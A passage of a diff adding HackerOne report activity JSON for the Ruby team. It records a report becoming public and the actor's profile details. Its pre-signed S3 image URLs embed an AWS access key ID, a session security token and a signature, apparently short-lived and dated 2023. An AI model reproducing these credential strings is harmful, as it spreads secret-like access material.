+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065521Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5f860d3b2566673ca00b5a530464361d820535ec09dbd08e726991f9ee93d28d"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 21862586,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-05-16T03:07:30.159Z",
+      "updated_at": "2023-05-16T03:07:30.159Z",
+      "actor": {
+        "username": "hsbt",
+        "cleared": false,
+        "verified": false,
+        "url": "/hsbt",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065521Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5f860d3b2566673ca00b5a530464361d820535ec09dbd08e726991f9ee93d28d"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
